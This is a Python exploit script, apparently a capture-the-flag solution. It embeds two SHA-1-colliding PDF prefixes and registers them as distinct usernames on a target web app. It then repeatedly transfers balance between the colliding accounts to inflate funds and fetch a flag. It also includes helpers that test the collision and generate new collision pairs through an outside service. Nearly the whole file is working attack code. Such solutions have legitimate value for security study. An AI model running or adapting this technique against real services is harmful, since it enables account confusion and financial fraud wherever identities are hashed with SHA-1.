# Python 3

import argparse
import binascii
import hashlib
import io
import os
import secrets # py3.5 pip install python2-secrets
import zipfile

import requests # pip install requests

USER_A = binascii.unhexlify(b'''
2550 4446 2d31 2e33 0a25 e2e3 cfd3 0a0a 0a31 2030 206f 626a 0a3c 3c2f 5769 6474
6820 3220 3020 522f 4865 6967 6874 2033 2030 2052 2f54 7970 6520 3420 3020 522f
5375 6274 7970 6520 3520 3020 522f 4669 6c74 6572 2036 2030 2052 2f43 6f6c 6f72
5370 6163 6520 3720 3020 522f 4c65 6e67 7468 2038 2030 2052 2f42 6974 7350 6572
436f 6d70 6f6e 656e 7420 383e 3e0a 7374 7265 616d 0aff d8ff fe00 2453 4841 2d31
2069 7320 6465 6164 2121 2121 2185 2fec 0923 3975 9c39 b1a1 c63c 4c97 e1ff fe01
7f46 dc93 a6b6 7e01 3b02 9aaa 1db2 560b 45ca 67d6 88c7 f84b 8c4c 791f e02b 3df6
14f8 6db1 6909 01c5 6b45 c153 0afe dfb7 6038 e972 722f e7ad 728f 0e49 04e0 46c2
3057 0fe9 d413 98ab e12e f5bc 942b e335 42a4 802d 98b5 d70f 2a33 2ec3 7fac 3514
e74d dc0f 2cc1 a874 cd0c 7830 5a21 5664 6130 9789 606b d0bf 3f98 cda8 0446 29a1
0000 8f25
'''.replace(b'\n',b'').replace(b' ', b''))
USER_B = binascii.unhexlify(b'''
2550 4446 2d31 2e33 0a25 e2e3 cfd3 0a0a 0a31 2030 206f 626a 0a3c 3c2f 5769 6474
6820 3220 3020 522f 4865 6967 6874 2033 2030 2052 2f54 7970 6520 3420 3020 522f
5375 6274 7970 6520 3520 3020 522f 4669 6c74 6572 2036 2030 2052 2f43 6f6c 6f72
5370 6163 6520 3720 3020 522f 4c65 6e67 7468 2038 2030 2052 2f42 6974 7350 6572
436f 6d70 6f6e 656e 7420 383e 3e0a 7374 7265 616d 0aff d8ff fe00 2453 4841 2d31
2069 7320 6465 6164 2121 2121 2185 2fec 0923 3975 9c39 b1a1 c63c 4c97 e1ff fe01
7346 dc91 66b6 7e11 8f02 9ab6 21b2 560f f9ca 67cc a8c7 f85b a84c 7903 0c2b 3de2
18f8 6db3 a909 01d5 df45 c14f 26fe dfb3 dc38 e96a c22f e7bd 728f 0e45 bce0 46d2
3c57 0feb 1413 98bb 552e f5a0 a82b e331 fea4 8037 b8b5 d71f 0e33 2edf 93ac 3500
eb4d dc0d ecc1 a864 790c 782c 7621 5660 dd30 9791 d06b d0af 3f98 cda4 bc46 29b1
0000 8f25
'''.replace(b'\n',b'').replace(b' ', b''))

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('base_url')
    parser.add_argument('-t', '--test', action='store_true', help='test collision')
    parser.add_argument('-g', '--gen-collision', action='store_true', help='generate collision')

    args = parser.parse_args()
    if args.test:
        test(args.base_url)
    elif args.gen_collision:
        gen_collision()
    else:
        run_attack(args.base_url)

def run_attack(base_url):
    seed = secrets.token_bytes(4)

    ua, ub = USER_A + seed, USER_B + seed
    h1, h2 = hashlib.sha1(ua).hexdigest(), hashlib.sha1(ub).hexdigest()
    assert h1 == h2

    index_url = base_url + '/index.html'
    register_url = base_url + '/api/register'
    login_url = base_url + '/api/login'
    balance_url =  base_url +'/api/balance'
    flag_url =  base_url +'/api/flag'
    transfer_url = base_url + '/api/transfer'

    s = requests.Session()
    s.get(index_url)
    s.post(register_url, data={"user":ua, "pass": 'a'*20})
    s.post(login_url, data={"user":ua, "pass": 'a'*20})

    r = s.post(balance_url, data={})
    balance = r.json()['balance'] if 'balance' in r.json() else None
    while balance is not None and balance < 10000000000:
        if balance is None:
            print('Could not read balance, exiting')
            return
        s.post(transfer_url, data={"amount":str(balance), "target": ub})
        r = s.post(balance_url, data={})
        balance = r.json()['balance'] if 'balance' in r.json() else None
        print(balance)

    r = s.get(flag_url)
    print(r.json())

def test(base_url):
    seed = secrets.token_bytes(4)

    ua, ub = USER_A + seed, USER_B + seed
    h1, h2 = hashlib.sha1(ua).hexdigest(), hashlib.sha1(ub).hexdigest()
    assert h1 == h2

    index_url = base_url + '/index.html'
    register_url = base_url + '/api/register'

    s = requests.Session()
    s.get(index_url)
    s.post(register_url, data={"user":ua, "pass": 'a'*20})
    r = s.post(register_url, data={"user":ub, "pass": 'a'*20})
    print(r.json())

def gen_collision():
    # Don't spam alf.nu with requests
    if os.path.exists('/tmp/r.zip'):
        with open('/tmp/r.zip', 'rb') as f:
            zip_file = io.BytesIO(f.read())
    else:
        files = {
            'a': io.BytesIO(b'aaaa'),
            'b': io.BytesIO(b'bbbb')
        }
        r = requests.post('https://alf.nu/sha', files=files, data=dict(x=1,y=1))
        tmp = r.content

        with open('/tmp/r.zip', 'wb') as f:
            f.write(tmp)
        zip_file = io.BytesIO(tmp)

    with zipfile.ZipFile(zip_file) as z:
        with z.open('a.pdf') as f:
            a = f.read()
        with z.open('b.pdf') as f:
            b = f.read()

    h1, h2 = hashlib.sha1(a).hexdigest(), hashlib.sha1(b).hexdigest()
    assert h1 == h2

    # Get the values as short as possible
    chop_at = 0
    for i in range(500, 0, -1):
        h1, h2 = hashlib.sha1(a[:i]).hexdigest(), hashlib.sha1(b[:i]).hexdigest()
        if h1 == h2:
            chop_at = i
        else:
            break
    a = a[:chop_at]
    b = b[:chop_at]
    h1, h2 = hashlib.sha1(a).hexdigest(), hashlib.sha1(b).hexdigest()
    assert h1 == h2
    print('checks out', len(a), len(b))

if __name__ == '__main__':
    main()
